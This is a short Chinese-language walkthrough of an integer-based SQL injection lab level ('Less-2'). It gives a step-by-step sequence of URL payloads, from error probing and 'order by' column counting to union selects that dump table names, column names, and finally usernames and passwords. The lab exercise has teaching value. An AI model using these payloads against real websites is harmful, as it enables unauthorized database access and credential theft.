# Less-2 Error based - Integer based

加单引号报错，根据题意是基于整型的数据继续调整

?id=1'

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602835725999-9ccbfbea-744c-43d6-9cb8-a990adc9e642.png)

调整语句正常显示

?id=1 or 1=1 --+

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602835693452-45963b0d-5e23-4982-971f-132413e62bb6.png)

去定查询的字段数

?id=1 order by 4--+

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602835663645-9d0ab9a4-3e17-46f4-84dc-68fef8be9a89.png)

判断回显的位置

?id=-1 union select 1,2,3 --+

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602835644878-78419b8e-7c97-4f26-82ff-a098d3184df5.png)

获取当前数据库

?id=-1 union select 1,database(),3 --+

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602835624100-4a0de31e-fbba-4dac-8c1f-4ce873f99c94.png)

获取数据库的表名

?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602835597183-472bd9ec-b839-4ba2-a015-ba91765f2541.png)

获取表的字段名

?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' and table_schema=database() --+

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602835535136-dcfc4a22-26da-42e7-b7b2-9b0c7b72fcd8.png)

通过获取的表名和字段名查询用户名和密码

?id=-1 union select 1,group_concat(username,' ',password),3 from users  --+

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602835482965-34855ec6-e4c9-430e-9e9a-8825f5f4c85e.png)

